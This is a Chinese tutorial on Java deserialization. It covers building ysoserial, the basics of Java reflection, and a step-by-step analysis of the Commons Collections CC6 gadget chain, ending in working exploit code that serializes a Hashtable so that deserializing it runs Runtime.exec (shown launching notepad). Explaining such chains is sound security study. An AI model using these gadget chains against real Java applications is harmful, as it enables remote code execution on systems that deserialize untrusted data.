# java安全 反序列化(二)

## 前言

寻找反序列化链(Gadget)

 1. 在项目里找漏洞

    readObject里的漏洞一般比较少

 2. 寻找项目的依赖库类中的Gadget

    一些依赖也会有反序列化的操作，如果jar包中的某些类在进行反序列化时有可控的点，就可以利用jar包中存在的漏洞来构造调用链

## ysoserial工具

ysoserial工具可以帮助我们在依赖库里面找到利用链。

```
git clone https://github.com/frohoff/ysoserial.git
```

进入ysoserial目录，编译jar包

```
mvn clean package -DskipTests
```

![image-20221128161645257](https://static.sechelper.com/img/2022/11/30/ace03ab928792a8918ed428060700e51.png)

出现BUILD SUCCESS表示编译成功，在target文件夹下

注意：要使用java 1.7+ 的jdk环境

## 最经典的反序列化利用链

Apache Commons Collections.jar中的一条pop链，这个类库使用广泛，所以很多大型的应用也存在着这个漏洞。

Commons Collections 在3.x < 3.2.2 以及4.0这些版本范围里，存在反序列化漏洞

当目标Java应用依赖库里包含存在漏洞的Commons Collections库，且对由攻击者可控的数据进行反序列化时，即会造成任意代码执行。

我们以ysoserial里CommonsCollections6这个payload为例，进行分析。

先使用ysoserial生成反序列化的payload

![image-20221128161942308](https://static.sechelper.com/img/2022/11/30/d586a438e2cecae4d372a693d6c9e453.png)

使用maven导入commons-collections依赖

pom.xml

```xml
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
```

在创建测试代码

TestCC6

```java
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.lang.reflect.InvocationTargetException;

public class TestCC6 {
    public static void main(String[] args) throws IOException, ClassNotFoundException{
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("cc6.ser"));
        objectInputStream.readObject();
        objectInputStream.close();
    }
}
```

把生成的cc6.ser放在项目根目录下执行代码，弹出计算机

![image-20221128172245115](https://static.sechelper.com/img/2022/11/30/207f83919d1ac4061085f2bfa2c9cc16.png)

运行环境为java11

要解析cc6链的结构代码要先学习下java反射相关，我们可以在很多java漏洞的POC中看到反射的利用，所以学习java安全是绕不开反射的。

## java反射

Java反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法;对于任意一个对象，都能够调用它的任意方法和属性(包括私有的方法和属性);这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制。



涉及到java中的几个类：

```java
Class类	代表类的实体，在运行的java应用程序中表示类和接口

Field类：代表类的成员变量(成员变量也称为类的属性)

Method类：代表类的方法

Constructor类：代表类的构造方法
```

在Java中你看到的绝大部分成员，其实都可以称之为对象（除了普通数据类型和静态成员)。

类也是对象，类是java.lang.Class类的实例对象

Class类抽象出了java中类的特征并提供了一些方法



有三种方式获得Class类实例：

```java
1.如果知道class的完整类名，可以调用Class类的静态方法Class.forName获取
Class clz = Class.forName("com.dong.User");

2.任何一个类都有一个隐含的静态成员class，这个属性就存储着这个类对应的Class类的实例：
Class clz = com.dong.User.class;

3.调用这个对象的getClass()方法：
Class clz = (new User()).getClass();
```



### 测试获取，调用方法

User

```java
public class User {
        public void test(String name){
            System.out.println("Hello："+name);
        }
    }
```

#### 获取方法：

我们之前已经提到了Method这个类，java中所有的方法都是Method类型，所以我们通过反射机制获取到某个对象的方法也是Method类型的。通过Class对象获取某个方法：

方法的名称和方法的参数列表，两者信息才能确定某一个方法

```
clz.getMethod(方法名，这个方法的参数类型)
```

#### 调用方法：

Method类中有一个invoke方法，就是用来调用特定方法的，用法如下：

```java
public Object invoke(Object obj, Object... args)
```

第一个参数是调用该方法的对象，第二个参数是一个可变长参数，是这个方法的需要传入的参数

testUser

```java
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class testUser {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class user = (new User()).getClass();
        //第二个参数要传class类，如果参数有多个传入：new Class[]{String.class,String.class} 
        Method test = user.getMethod("test",String.class);
        //如果第二个参数有多个传入：new Object[]{"1","2"}
        test.invoke((new User()),"liangBan");
    }
}
```

#### ![image-20221129140628374](https://static.sechelper.com/img/2022/11/30/0a370e8e9eba1c2a4529b7578d77d6f0.png)

### 修改变量

User

```java
public class User {
    private String pass = "123321";
    @Override
    public String toString() {
        return "User{" +
                "pass='" + pass + '\'' +
                '}';
    }
}
```

testUser

```java
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class testUser {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException {
        Class user = (new User()).getClass();
        //获取私有属性对象
        Field pass = user.getDeclaredField("pass");
        //关闭java访问控制检查，就可以给private属性赋值调用
        pass.setAccessible(true);
        User u = new User();
		System.out.println(u);
        pass.set(u,"liangban");
        System.out.println(u);
        System.out.println(pass.get(u));
    }
}

```

### 常用方法

获取类:forName / getClass

获取类下的函数: getMethod/s / getDeclaredMethod/s

执行类下的函数: invoke

获取类构造方法: getConstructor/s / getDeclaredConstructor/s



## CC链源码分析

我们需要payload经过反序列化过后会执行：`Runtime.getRuntime().exec("任意命令")`

CommonsCollections6.java 在\ysoserial\src\main\java\ysoserial\payloads\CommonsCollections6.java

```java
package ysoserial.payloads;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.MATTHIASKAISER })
public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<Serializable> {

    public Serializable getObject(final String command) throws Exception {

        final String[] execArgs = new String[] { command };

        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };

        Transformer transformerChain = new ChainedTransformer(transformers);

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);

        return map;

    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections6.class, args);
    }
}
```

其中我们先看这里，是整个漏洞的核心，我们一个个函数的看

```java
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };
        Transformer transformerChain = new ChainedTransformer(transformers);
```

跟进ConstantTransformer看一下

```java
package org.apache.commons.collections.functors;

import java.io.Serializable;
import org.apache.commons.collections.Transformer;

public class ConstantTransformer implements Transformer, Serializable {
    private static final long serialVersionUID = 6374440726369055124L;
    public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);
    private final Object iConstant;

    public static Transformer getInstance(Object constantToReturn) {
        return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn));
    }

    public ConstantTransformer(Object constantToReturn) {
        this.iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return this.iConstant;
    }

    public Object getConstant() {
        return this.iConstant;
    }
}
```

它的transform方法会返回iConstant，而this.iConstant是来自构造器参数constantToReturn，所以我们在实例化时传入一个Runtime.class返回的也是Runtime.class就解决了`Runtime.getRuntime().exec("任意命令")`开头我们需要的Runtime类

再跟进InvokerTransformer看一下实现了什么，这里只展示需要的代码

```java
构造方法
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }

transform方法
	public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var4) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6);
            }
        }
    }
```

在前面说到了反射机制，这里的transform很明显就是利用了反射机制，是执行了某个对象的某个方法

使用的this.iMethodName，this.iParamTypes，this.iArgs都是可以通过构造方法传入的，也就是我们可控的，那么只要input可控，就可以执行任意对象的任意方法，这里就要看到ChainedTransformer类了

ChainedTransformer

```java
    //构造方法
public ChainedTransformer(Transformer[] transformers) {
        this.iTransformers = transformers;
    }
    //transform方法
public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }

        return object;
    }
```

这个类的构造函数接收一个Transformer类型的数组，并且在transform方法中会遍历这个数组，并调用数组中的每一个成员的transform方法，而且会把上一个成员调用transform的方法返回的对象，当作下一个成员的transform方法的参数，这就是一个链式调用，配合InvokerTransformer类中的transform方法，input也可控了



至此整个漏洞核心已经明了，利用ConstantTransformer的transform方法获取Runtime.class，再利用ChainedTransformer的transform方法把Runtime.class传给InvokerTransformer的transform方法利用，再利用ChainedTransformer的transform方法不断调用InvokerTransformer的transform方法，利用这个方法的反射相关代码，所有参数都是可控的。

可能有点晕，这三个XXXtransformer类都是实现了TransFormer这个接口，所以他们都有一个transform方法

```java
InvokerTransformer ：transform方法通过反射可以执行一个对象的任意方法

ConstantTransformer ： transform返回构造函数传入的参数

ChainedTransformer ：transform方法执行构造函数传入数组的每一个成员的transform方法
```

把这几个transformer组合起来构造一个执行链，代码如下,这是直接截取的CC6链的部分代码：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class TestTest {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"notepad"}),
                new ConstantTransformer(1) };

        Transformer transformerChain = new ChainedTransformer(transformers);
        transformerChain.transform("a");
    }
}
```

执行代码，利用成功，成功弹出记事本

![image-20221130102839739](https://static.sechelper.com/img/2022/11/30/57872890ea984240bce96a69a9a0217a.png)

这里只是手动触发，现在要看一下被动触发，也就是在真实的应用中怎么触发ChainedTransformer的transform方法。

全局寻找哪个类中使用了factory方法，并且我们可以利用，锁定到了LazyMap类

### LazyMap利用链

LazyMap类中调用了transform的地方，在get方法中： 

```java
    public Object get(Object key) {
        if (!this.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            this.map.put(key, value);
            return value;
        } else {
            return this.map.get(key);
        }
    }
```

调用了this.factory.transform方法，而   `this.factory`是我们可控的，构造函数如下：

```java
    protected LazyMap(Map map, Transformer factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        } else {
            this.factory = factory;
        }
    }
```

构造利用链时，我们只需要令factory为我们构造的ChainedTransformer就可以触发ChainedTransformer的transform方法。

现在倒是找到了能够触发transform()的地方了，但是这还是不能在反序列化的时候自动触发，我们都知道反序列化只会自动触发函数readObject(),所以，接下来我们需要找到一个类，这个类重写了readObject(),并且readObject中直接或者间接的调用了刚刚找到的get方法

到这一步，正常的代码审计过程中，会采取两种策略，一种是继续向上回溯，找get方法被调用的位置，另一种策略就是全局搜索readObject()方法，看看有没有哪个类直接就调用了这个方法或者readObject中有可疑的操作，最后能够间接触发这个方法。

寻找到了TiedMapEntry类

```java
public class TiedMapEntry implements Map.Entry, KeyValue, Serializable {
    private static final long serialVersionUID = -8453869361373831205L;
    private final Map map;
    private final Object key;

    public TiedMapEntry(Map map, Object key) {
        this.map = map;
        this.key = key;
    }

    public Object getValue() {
        return this.map.get(this.key);
    }

    public int hashCode() {
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
    }

    public String toString() {
        return this.getKey() + "=" + this.getValue();
    }
}
```

其中getValue方法也调用了get方法，如下：

```java
    public Object getValue() {
        return this.map.get(this.key);
    }
```

而且`this.map`我们也可以控制，构造方法：

```java
public TiedMapEntry(Map map, Object key) {
    this.map = map;
    this.key = key;
}
```

其中hashCode()和toString()方法间接执行了getValue方法，但是这个也没办法直接触发，因为它没有在readObject的时候调用，当在readObject的时候调用，才能让它自动执行，所以我们最终要找的还是readObject方法中的触发点，可以关注这三个方法谁能调用

在Hashtable中的readObject存在hashCode()方法，这是jdk内部的类

```java
public class Hashtable<K,V> extends Dictionary<K,V> implements Map<K,V>,Cloneable,java.io.Serializable {
    private transient Entry<?,?>[]table;
	private transient int count;
    private int threshold;
    private float loadFactor;
    private transient int modCount = o;
    private static final long serialVersionUID = 1421746759512286392L;
    
    private void readObject(java.io.0bjectInputStream s) throws IOException, ClassNotFoundException{
    //Read in the threshold and loadFactor
    s.defaultReadobject();
    //Read the number of elements and then all the key/value objects
    for (; elements > 0; elements--) {
        K key = (K)s.readObject()
		v value = (V)s.readObject();
        reconstitutionPut(table, key, value);
    }
}
private void reconstitutionPut(Entry<?,?>[]tab, K key, v value) throws StreamCorruptedException{
    if (value == null) {
        throw new java.io.StreamCorruptedException();
    }                        
    int hash = key.hashCode();
	int index =(hash & 0x7FFFFFFF) % tab.length;
	for (Entry<?,?> e = tab[index]; e!= null ; e= e.next) {
        if((e.hash == hash) && e.key.equals(key)) {
        	throw new java.io.StreamCorruptedException(0);
    }
}   
```

把Hashtable形成的对象序列化进去，那么当在反序列化时，要去调用Hashtable的readObject，再间接去调用hashCode()里的getValue()再去调用LazyMap中的transform()方法,而transform()方法里是我们构造的ChainedTransformer

```java
public class TestTest {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        disableWarning();
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"notepad"})};

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(innerMap, transformerChain);
        Hashtable<Object, Object> hashtable = new Hashtable<>();
        hashtable.put("pwn","dd");

        Field table = hashtable.getClass().getDeclaredField("table");
        table.setAccessible(true);
        Object[] hasharray = (Object[]) table.get(hashtable);

        for (Object obj: hasharray){
            if (obj != null){
                Field entykey = obj.getClass().getDeclaredField("key");
                entykey.setAccessible(true);
                entykey.set(obj,entry);
            }
        }
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("CC6.ser"));
        objectOutputStream.writeObject(hashtable);
        objectOutputStream.close();

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("CC6.ser"));
        ois.readObject();
        ois.close();
    }
```

成功弹出记事本

![image-20221130152623009](https://static.sechelper.com/img/2022/11/30/b34a2b07c66d2e11c1a01deaa730237b.png)

还有很多其他可以利用的类和利用链：

BadAttributeValueExpException的readObject方法

​		toString方法与php中的`__toString`方法类似，在进行字符串拼接或者手动把某个类转换为字符串的时候会被调用

AnnotationInvocationHandler的invoke方法中有get的调用再配合动态代理

**TransformedMap**利用链，另一条POP链
